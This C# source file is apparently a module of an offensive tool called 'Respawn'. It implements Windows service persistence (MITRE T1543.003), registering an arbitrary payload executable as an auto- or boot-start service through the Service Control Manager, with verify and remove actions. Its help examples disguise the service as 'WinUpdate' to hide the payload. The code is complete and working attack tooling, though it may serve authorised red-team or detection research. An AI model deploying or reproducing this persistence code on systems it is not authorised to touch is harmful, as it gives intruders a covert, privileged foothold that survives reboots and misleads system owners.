using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.Runtime.InteropServices;

namespace Respawn.Techniques.Service
{
    public class ServiceModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "svc";
        public string Name        => "Windows Services";
        public string Mitre       => "T1543.003";
        public string Description => "Persist by abusing the Windows Service Control Manager (SCM) to register a new system service, allowing the payload to execute autonomously in the background during system boot or on-demand. Payload MUST be a valid Windows Service executable";

        // ─── P/Invoke ─────────────────────────────────────────────────────────────

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenSCManager(string? lpMachineName, string? lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName,
            uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl,
            string lpBinaryPathName, string? lpLoadOrderGroup, IntPtr lpdwTagId,
            string? lpDependencies, string? lpServiceStartName, string? lpPassword);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool QueryServiceConfig(IntPtr hService, IntPtr lpServiceConfig, uint cbBufSize, out uint pcbBytesNeeded);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool ChangeServiceConfig(IntPtr hService, uint dwServiceType, uint dwStartType,
            uint dwErrorControl, string? lpBinaryPathName, string? lpLoadOrderGroup, IntPtr lpdwTagId,
            string? lpDependencies, string? lpServiceStartName, string? lpPassword, string? lpDisplayName);

        // ─── Constants ───────────────────────────────────────────────────────────

        const uint SC_MANAGER_ALL_ACCESS     = 0xF003F;
        const uint SERVICE_ALL_ACCESS        = 0xF01FF;
        const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010;
        const uint SERVICE_ERROR_NORMAL      = 0x00000001;
        const uint SERVICE_START_AUTO        = 0x00000002;
        const uint SERVICE_START_BOOT        = 0x00000000;
        const uint SERVICE_START_MANUAL      = 0x00000003;

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p4", "types");

            // // 2. CRITICAL PAYLOAD REQUIREMENT
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  TECHNICAL REQUIREMENTS::");
            // Console.ResetColor();
            // Console.WriteLine("    - Payload MUST be a valid Windows Service executable");
            // // Console.WriteLine("    - Standard console apps will FAIL to start as a service");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Internal service name (no spaces)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to the service executable");
            TechniqueHelpBuilder.RenderOption("-dn, --displayname", "Visible name in Services.msc");
            TechniqueHelpBuilder.RenderOption("-st, --starttype", "Startup: auto, boot, manual");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t svc -a list-types");
            TechniqueHelpBuilder.RenderExample("Respawn -t svc -a install -n \"WinUpdate\" -p \"C:\\p.exe\" -st auto");
            TechniqueHelpBuilder.RenderExample("Respawn -t svc -a verify  -n \"WinUpdate\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t svc -a remove  -n \"WinUpdate\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("types", StringComparison.OrdinalIgnoreCase))
                return ServiceTypes.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var typeDef = ServiceTypes.GetById(ctx.StartType);
            if (typeDef == null)
                return TechniqueResult.Fail($"Unknown start type '{ctx.StartType}'. Use -a list-types to see available types.");

            IntPtr scm     = IntPtr.Zero;
            IntPtr service = IntPtr.Zero;

            try
            {
                scm = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
                if (scm == IntPtr.Zero)
                    return TechniqueResult.Denied("Access denied opening Service Control Manager. Run as administrator.");

                service = OpenService(scm, ctx.Name, SERVICE_ALL_ACCESS);
                if (service != IntPtr.Zero)
                {
                    CloseServiceHandle(service);
                    CloseServiceHandle(scm);
                    return TechniqueResult.Exists($"Service '{ctx.Name}' already exists.");
                }

                uint startType = ctx.StartType.ToLower() switch
                {
                    "auto"   => SERVICE_START_AUTO,
                    "boot"   => SERVICE_START_BOOT,
                    "manual" => SERVICE_START_MANUAL,
                    _        => SERVICE_START_AUTO
                };

                string displayName = string.IsNullOrEmpty(ctx.DisplayName) ? ctx.Name : ctx.DisplayName;

                service = CreateService(
                    scm,
                    ctx.Name,
                    displayName,
                    SERVICE_ALL_ACCESS,
                    SERVICE_WIN32_OWN_PROCESS,
                    startType,
                    SERVICE_ERROR_NORMAL,
                    ctx.Payload,
                    null,
                    IntPtr.Zero,
                    null,
                    null,
                    null
                );

                if (service == IntPtr.Zero)
                    return TechniqueResult.Fail($"Failed to create service. Error code: {Marshal.GetLastWin32Error()}");

                if (!string.IsNullOrEmpty(ctx.Description))
                    SetServiceDescription(ctx.Name, ctx.Description);

                return TechniqueResult.Ok($"Installed service '{ctx.Name}' -> '{ctx.Payload}' starttype '{ctx.StartType}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Services require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
            finally
            {
                if (service != IntPtr.Zero) CloseServiceHandle(service);
                if (scm     != IntPtr.Zero) CloseServiceHandle(scm);
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            IntPtr scm     = IntPtr.Zero;
            IntPtr service = IntPtr.Zero;

            try
            {
                scm = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
                if (scm == IntPtr.Zero)
                    return TechniqueResult.Denied("Access denied opening Service Control Manager. Run as administrator.");

                service = OpenService(scm, ctx.Name, SERVICE_ALL_ACCESS);
                if (service == IntPtr.Zero)
                    return TechniqueResult.NotFound($"Service '{ctx.Name}' not found.");

                if (!DeleteService(service))
                    return TechniqueResult.Fail($"Failed to delete service. Error code: {Marshal.GetLastWin32Error()}");

                return TechniqueResult.Ok($"Removed service '{ctx.Name}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Services require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
            finally
            {
                if (service != IntPtr.Zero) CloseServiceHandle(service);
                if (scm     != IntPtr.Zero) CloseServiceHandle(scm);
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            IntPtr scm     = IntPtr.Zero;
            IntPtr service = IntPtr.Zero;

            try
            {
                scm = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
                if (scm == IntPtr.Zero)
                    return TechniqueResult.Denied("Access denied opening Service Control Manager. Run as administrator.");

                service = OpenService(scm, ctx.Name, SERVICE_ALL_ACCESS);
                if (service == IntPtr.Zero)
                    return TechniqueResult.NotFound($"Service '{ctx.Name}' not found.");

                string keyPath = $@"SYSTEM\CurrentControlSet\Services\{ctx.Name}";
                using var key  = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath);
                if (key == null)
                    return TechniqueResult.NotFound($"Service registry key not found for '{ctx.Name}'.");

                string payload     = key.GetValue("ImagePath")?.ToString() ?? "unknown";
                string displayName = key.GetValue("DisplayName")?.ToString() ?? "unknown";
                int    startType   = (int)(key.GetValue("Start") ?? 2);

                string startTypeStr = startType switch
                {
                    0 => "boot",
                    2 => "auto",
                    3 => "manual",
                    _ => startType.ToString()
                };

                return TechniqueResult.Ok($"Verified service '{ctx.Name}' | Display: '{displayName}' | Payload: '{payload}' | Start: '{startTypeStr}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Services require administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
            finally
            {
                if (service != IntPtr.Zero) CloseServiceHandle(service);
                if (scm     != IntPtr.Zero) CloseServiceHandle(scm);
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No name specified. Use -n <name>.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.StartType))
            {
                error = "No start type specified. Use -st <type-id> or see -a list-types.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private void SetServiceDescription(string serviceName, string description)
        {
            try
            {
                string keyPath = $@"SYSTEM\CurrentControlSet\Services\{serviceName}";
                using var key  = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(keyPath, writable: true);
                key?.SetValue("Description", description);
            }
            catch { }
        }
    }
}